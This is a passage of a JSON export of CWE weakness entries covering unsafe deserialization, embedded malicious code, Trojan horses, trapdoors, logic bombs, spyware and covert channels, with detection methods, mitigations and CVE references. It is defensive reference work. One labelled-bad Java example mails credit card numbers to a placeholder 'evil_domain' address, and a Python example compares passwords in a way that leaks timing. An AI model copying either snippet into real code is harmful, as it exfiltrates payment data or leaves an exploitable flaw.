          "Description": "chain: bypass of untrusted deserialization issue (CWE-502) by using an assumed-trusted class (CWE-183)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-12799"
        },
        {
          "Reference": "CVE-2015-8103",
          "Description": "Deserialization issue in commonly-used Java library allows remote execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2015-8103"
        },
        {
          "Reference": "CVE-2015-4852",
          "Description": "Deserialization issue in commonly-used Java library allows remote execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2015-4852"
        },
        {
          "Reference": "CVE-2013-1465",
          "Description": "Use of PHP unserialize function on untrusted input allows attacker to modify application configuration.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2013-1465"
        },
        {
          "Reference": "CVE-2012-3527",
          "Description": "Use of PHP unserialize function on untrusted input in content management system might allow code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-3527"
        },
        {
          "Reference": "CVE-2012-0911",
          "Description": "Use of PHP unserialize function on untrusted input in content management system allows code execution using a crafted cookie value.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-0911"
        },
        {
          "Reference": "CVE-2012-0911",
          "Description": "Content management system written in PHP allows unserialize of arbitrary objects, possibly allowing code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-0911"
        },
        {
          "Reference": "CVE-2011-2520",
          "Description": "Python script allows local users to execute code via pickled data.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-2520"
        },
        {
          "Reference": "CVE-2012-4406",
          "Description": "Unsafe deserialization using pickle in a Python script.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-4406"
        },
        {
          "Reference": "CVE-2003-0791",
          "Description": "Web browser allows execution of native methods via a crafted string to a JavaScript function that deserializes the string.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0791"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Deserialization of untrusted data"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "SER01-J",
          "EntryName": "Do not deviate from the proper signatures of serialization methods"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "SER03-J",
          "EntryName": "Do not serialize unencrypted, sensitive data"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "SER06-J",
          "EntryName": "Make defensive copies of private mutable components during deserialization"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "SER08-J",
          "EntryName": "Do not use the default serialized form for implementation defined invariants"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP25",
          "EntryName": "Tainted input to variable"
        }
      ],
      "RelatedAttackPatterns": [
        "586"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        },
        {
          "ExternalReferenceID": "REF-461",
          "Authors": [
            "Matthias Kaiser"
          ],
          "Title": "Exploiting Deserialization Vulnerabilities in Java",
          "PublicationYear": "2015",
          "PublicationMonth": "10",
          "PublicationDay": "28",
          "URL": "https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-462",
          "Authors": [
            "Sam Thomas"
          ],
          "Title": "PHP unserialization vulnerabilities: What are we missing?",
          "PublicationYear": "2015",
          "PublicationMonth": "08",
          "PublicationDay": "27",
          "URL": "https://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-463",
          "Authors": [
            "Gabriel Lawrence",
            "Chris Frohoff"
          ],
          "Title": "Marshalling Pickles: How deserializing objects can ruin your day",
          "PublicationYear": "2015",
          "PublicationMonth": "01",
          "PublicationDay": "28",
          "URL": "https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-464",
          "Authors": [
            "Heine Deelstra"
          ],
          "Title": "Unserializing user-supplied data, a bad idea",
          "PublicationYear": "2010",
          "PublicationMonth": "08",
          "PublicationDay": "25",
          "URL": "https://drupalsun.com/heine/2010/08/25/unserializing-user-supplied-data-bad-idea",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-465",
          "Authors": [
            "Manish S. Saindane"
          ],
          "Title": "Black Hat EU 2010 - Attacking Java Serialized Communication",
          "PublicationYear": "2010",
          "PublicationMonth": "04",
          "PublicationDay": "26",
          "URL": "https://www.slideshare.net/msaindane/black-hat-eu-2010-attacking-java-serialized-communication",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-466",
          "Authors": [
            "Nadia Alramli"
          ],
          "Title": "Why Python Pickle is Insecure",
          "PublicationYear": "2009",
          "PublicationMonth": "09",
          "PublicationDay": "09",
          "URL": "http://michael-rushanan.blogspot.com/2012/10/why-python-pickle-is-insecure.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-467",
          "Authors": [
            "Nelson Elhage"
          ],
          "Title": "Exploiting misuse of Python's \"pickle\"",
          "PublicationYear": "2011",
          "PublicationMonth": "03",
          "PublicationDay": "20",
          "URL": "https://blog.nelhage.com/2011/03/exploiting-pickle/"
        },
        {
          "ExternalReferenceID": "REF-468",
          "Authors": [
            "Chris Frohoff"
          ],
          "Title": "Deserialize My Shorts: Or How I Learned to Start Worrying and Hate Java Object Deserialization",
          "PublicationYear": "2016",
          "PublicationMonth": "03",
          "PublicationDay": "21",
          "URL": "https://speakerdeck.com/frohoff/owasp-sd-deserialize-my-shorts-or-how-i-learned-to-start-worrying-and-hate-java-object-deserialization",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "The relationships between CWE-502 and CWE-915 need further exploration. CWE-915 is more narrowly scoped to object modification, and is not necessarily used for deserialization."
        }
      ]
    },
    {
      "ID": "506",
      "Name": "Embedded Malicious Code",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains code that appears to be malicious in nature.",
      "ExtendedDescription": "Malicious flaws have acquired colorful names, including Trojan horse, trapdoor, timebomb, and logic-bomb. A developer might insert malicious code with the intent to subvert the security of a product or its host system at some time in the future. It generally refers to a program that performs a useful service but exploits rights of the program's user in a way the user does not intend.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "912",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Bundling"
        },
        {
          "Phase": "Distribution"
        },
        {
          "Phase": "Installation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Manual Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies\n\t\tGenerated Code Inspection",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tAutomated Monitored Execution",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tManual Source Code Review (not inspections)",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Automated Static Analysis",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tOrigin Analysis",
          "Effectiveness": "SOAR Partial"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Remove the malicious code and start an effort to ensure that no more malicious code exists. This may require a detailed review of all code, as it is possible to hide a serious attack in only one or two lines of code. These lines may be located almost anywhere in an application and may have been intentionally obfuscated by the attacker."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the example below, a malicous developer has injected code to send credit card numbers to the developer's own email address."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tboolean authorizeCard(String ccn) {\n```\n// Authorize credit card.* \n\t\t\t\n\t\t\t\n\t\t\t *...* \n\t\t\t\n\t\t\tmailCardNumber(ccn, \"evil_developer@evil_domain.com\");}"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-30877",
          "Description": "A command history tool was shipped with a code-execution backdoor inserted by a malicious party.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30877"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Landwehr",
          "EntryName": "Malicious"
        }
      ],
      "RelatedAttackPatterns": [
        "442",
        "448",
        "636"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1431",
          "Authors": [
            "Carl E. Landwehr",
            "Alan R. Bull",
            "John P. McDermott",
            "William S. Choi"
          ],
          "Title": "A Taxonomy of Computer Program Security Flaws, with Examples",
          "PublicationYear": "1993",
          "PublicationMonth": "11",
          "PublicationDay": "19",
          "URL": "https://cwe.mitre.org/documents/sources/ATaxonomyofComputerProgramSecurityFlawswithExamples%5BLandwehr93%5D.pdf",
          "URLDate": "2024-05-09"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Terminology",
          "Note": "The term \"Trojan horse\" was introduced by Dan Edwards and recorded by James Anderson [18] to characterize a particular computer security threat; it has been redefined many times [4,18-20]."
        }
      ]
    },
    {
      "ID": "507",
      "Name": "Trojan Horse",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product appears to contain benign or useful functionality, but it also contains code that is hidden from normal operation that violates the intended security policy of the user or the system administrator.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "506",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Operation"
          ],
          "Description": "Most antivirus software scans for Trojan Horses."
        },
        {
          "Phase": [
            "Installation"
          ],
          "Description": "Verify the integrity of the product that is being installed."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Landwehr",
          "EntryName": "Trojan Horse"
        }
      ],
      "RelatedAttackPatterns": [
        "698"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 7, \"Viruses, Trojans, and Worms In a Nutshell\" Page 208",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-1431",
          "Authors": [
            "Carl E. Landwehr",
            "Alan R. Bull",
            "John P. McDermott",
            "William S. Choi"
          ],
          "Title": "A Taxonomy of Computer Program Security Flaws, with Examples",
          "PublicationYear": "1993",
          "PublicationMonth": "11",
          "PublicationDay": "19",
          "URL": "https://cwe.mitre.org/documents/sources/ATaxonomyofComputerProgramSecurityFlawswithExamples%5BLandwehr93%5D.pdf",
          "URLDate": "2024-05-09"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Other",
          "Note": "Potentially malicious dynamic code compiled at runtime can conceal any number of attacks that will not appear in the baseline. The use of dynamically compiled code could also allow the injection of attacks on post-deployed applications."
        },
        {
          "Type": "Terminology",
          "Note": "\n\nDefinitions of \"Trojan horse\" and related terms have varied widely over the years, but common usage in 2008 generally refers to software that performs a legitimate function, but also contains malicious code.\n\n\nAlmost any malicious code can be called a Trojan horse, since the author of malicious code needs to disguise it somehow so that it will be invoked by a nonmalicious user (unless the author means also to invoke the code, in which case they presumably already possess the authorization to perform the intended sabotage). A Trojan horse that replicates itself by copying its code into other program files (see case MA1) is commonly referred to as a virus. One that replicates itself by creating new processes or files to contain its code, instead of modifying existing storage entities, is often called a worm. Denning provides a general discussion of these terms; differences of opinion about the term applicable to a particular flaw or its exploitations sometimes occur.\n"
        }
      ]
    },
    {
      "ID": "508",
      "Name": "Non-Replicating Malicious Code",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Non-replicating malicious code only resides on the target system or product that is attacked; it does not attempt to spread to other systems.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "507",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Operation"
          ],
          "Description": "Antivirus software can help mitigate known malicious code."
        },
        {
          "Phase": [
            "Installation"
          ],
          "Description": "Verify the integrity of the software that is being installed."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Landwehr",
          "EntryName": "Non-Replicating"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1431",
          "Authors": [
            "Carl E. Landwehr",
            "Alan R. Bull",
            "John P. McDermott",
            "William S. Choi"
          ],
          "Title": "A Taxonomy of Computer Program Security Flaws, with Examples",
          "PublicationYear": "1993",
          "PublicationMonth": "11",
          "PublicationDay": "19",
          "URL": "https://cwe.mitre.org/documents/sources/ATaxonomyofComputerProgramSecurityFlawswithExamples%5BLandwehr93%5D.pdf",
          "URLDate": "2024-05-09"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "509",
      "Name": "Replicating Malicious Code (Virus or Worm)",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Replicating malicious code, including viruses and worms, will attempt to attack other systems once it has successfully compromised the target system or the product.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "507",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Operation"
          ],
          "Description": "Antivirus software scans for viruses or worms."
        },
        {
          "Phase": [
            "Installation"
          ],
          "Description": "Always verify the integrity of the software that is being installed."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Landwehr",
          "EntryName": "Replicating (virus)"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1431",
          "Authors": [
            "Carl E. Landwehr",
            "Alan R. Bull",
            "John P. McDermott",
            "William S. Choi"
          ],
          "Title": "A Taxonomy of Computer Program Security Flaws, with Examples",
          "PublicationYear": "1993",
          "PublicationMonth": "11",
          "PublicationDay": "19",
          "URL": "https://cwe.mitre.org/documents/sources/ATaxonomyofComputerProgramSecurityFlawswithExamples%5BLandwehr93%5D.pdf",
          "URLDate": "2024-05-09"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "510",
      "Name": "Trapdoor",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A trapdoor is a hidden piece of code that responds to a special input, allowing its user access to resources without passing through the normal security enforcement mechanism.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "506",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability",
            "Access Control"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands",
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Automated Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInter-application Flow Analysis\n\t\tBinary / Bytecode simple extractor - strings, ELF readers, etc.",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies\n\t\tGenerated Code Inspection",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tAutomated Monitored Execution\n\t\tForced Path Execution\n\t\tDebugger\n\t\tMonitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFormal Methods / Correct-By-Construction",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Installation"
          ],
          "Description": "Always verify the integrity of the software that is being installed."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Identify and closely inspect the conditions for entering privileged areas of the code, especially those related to authentication, process invocation, and network communications."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Landwehr",
          "EntryName": "Trapdoor"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1431",
          "Authors": [
            "Carl E. Landwehr",
            "Alan R. Bull",
            "John P. McDermott",
            "William S. Choi"
          ],
          "Title": "A Taxonomy of Computer Program Security Flaws, with Examples",
          "PublicationYear": "1993",
          "PublicationMonth": "11",
          "PublicationDay": "19",
          "URL": "https://cwe.mitre.org/documents/sources/ATaxonomyofComputerProgramSecurityFlawswithExamples%5BLandwehr93%5D.pdf",
          "URLDate": "2024-05-09"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "511",
      "Name": "Logic/Time Bomb",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains code that is designed to disrupt the legitimate operation of the product (or its environment) when a certain time passes, or when a certain logical condition is met.",
      "ExtendedDescription": "When the time bomb or logic bomb is detonated, it may perform a denial of service such as crashing the system, deleting critical data, or degrading system response time. This bomb might be placed within either a replicating or non-replicating Trojan horse.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "506",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other",
            "Integrity"
          ],
          "Impact": [
            "Varies by Context",
            "Alter Execution Logic"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Installation"
          ],
          "Description": "Always verify the integrity of the product that is being installed."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Conduct a code coverage analysis using live testing, then closely inspect any code that is not covered."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Typical examples of triggers include system date or time mechanisms, random number generators, and counters that wait for an opportunity to launch their payload. When triggered, a time-bomb may deny service by crashing the system, deleting files, or degrading system response-time."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Landwehr",
          "EntryName": "Logic/Time Bomb"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-172",
          "Authors": [
            "Chris Wysopal"
          ],
          "Title": "Mobile App Top 10 List",
          "PublicationYear": "2010",
          "PublicationMonth": "12",
          "PublicationDay": "13",
          "URL": "https://www.veracode.com/blog/2010/12/mobile-app-top-10-list",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-1431",
          "Authors": [
            "Carl E. Landwehr",
            "Alan R. Bull",
            "John P. McDermott",
            "William S. Choi"
          ],
          "Title": "A Taxonomy of Computer Program Security Flaws, with Examples",
          "PublicationYear": "1993",
          "PublicationMonth": "11",
          "PublicationDay": "19",
          "URL": "https://cwe.mitre.org/documents/sources/ATaxonomyofComputerProgramSecurityFlawswithExamples%5BLandwehr93%5D.pdf",
          "URLDate": "2024-05-09"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "512",
      "Name": "Spyware",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product collects personally identifiable information about a human user or the user's activities, but the product accesses this information using other resources besides itself, and it does not require that user's explicit approval or direct input into the product.",
      "ExtendedDescription": "\"Spyware\" is a commonly used term with many definitions and interpretations. In general, it is meant to refer to products that collect information or install functionality that human users might not allow if they were fully aware of the actions being taken by the software. For example, a user might expect that tax software would collect a social security number and include it when filing a tax return, but that same user would not expect gaming software to obtain the social security number from that tax software's data.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "506",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Operation"
          ],
          "Description": "Use spyware detection and removal software."
        },
        {
          "Phase": [
            "Installation"
          ],
          "Description": "Always verify the integrity of the product that is being installed."
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "514",
      "Name": "Covert Channel",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A covert channel is a path that can be used to transfer information in a way not intended by the system's designers.",
      "ExtendedDescription": "Typically the system has not given authorization for the transmission and has no knowledge of its occurrence.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1229",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Access Control"
          ],
          "Impact": [
            "Read Application Data",
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)",
          "Effectiveness": "SOAR Partial"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-193",
          "Entries": [
            {
              "IntroText": "In this example, the attacker observes how long an authentication takes when the user types in the correct password."
            },
            {
              "BodyText": "When the attacker tries their own values, they can first try strings of various length. When they find a string of the right length, the computation will take a bit longer, because the for loop will run at least once. Additionally, with this code, the attacker can possibly learn one character of the password at a time, because when they guess the first character right, the computation will take longer than a wrong guesses. Such an attack can break even the most sophisticated password with a few hundred guesses."
            },
            {
              "Nature": "Bad",
              "Language": "Python",
              "ExampleCode": "```\n\tdef validate_password(actual_pw, typed_pw): \n\t\t\tif len(actual_pw) <> len(typed_pw): \n\t\t\t\treturn 0\n\t\t\tfor i in len(actual_pw): \n\t\t\t\tif actual_pw[i] <> typed_pw[i]: \n\t\t\t\t\treturn 0\n\t\t\treturn 1\n```"
            },
            {
              "BodyText": "Note that in this example, the actual password must be handled in constant time as far as the attacker is concerned, even if the actual password is of an unusual length. This is one reason why it is good to use an algorithm that, among other things, stores a seeded cryptographic one-way hash of the password, then compare the hashes, which will always be of the same length."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Landwehr",
          "EntryName": "Covert Channel"
        }
      ],
      "RelatedAttackPatterns": [
        "463"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1431",
          "Authors": [
            "Carl E. Landwehr",
            "Alan R. Bull",
            "John P. McDermott",
            "William S. Choi"
          ],
          "Title": "A Taxonomy of Computer Program Security Flaws, with Examples",
          "PublicationYear": "1993",
          "PublicationMonth": "11",
          "PublicationDay": "19",
          "URL": "https://cwe.mitre.org/documents/sources/ATaxonomyofComputerProgramSecurityFlawswithExamples%5BLandwehr93%5D.pdf",
          "URLDate": "2024-05-09"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Theoretical",
          "Note": "A covert channel can be thought of as an emergent resource, meaning that it was not an originally intended resource, however it exists due the application's behaviors."
        },
        {
          "Type": "Maintenance",
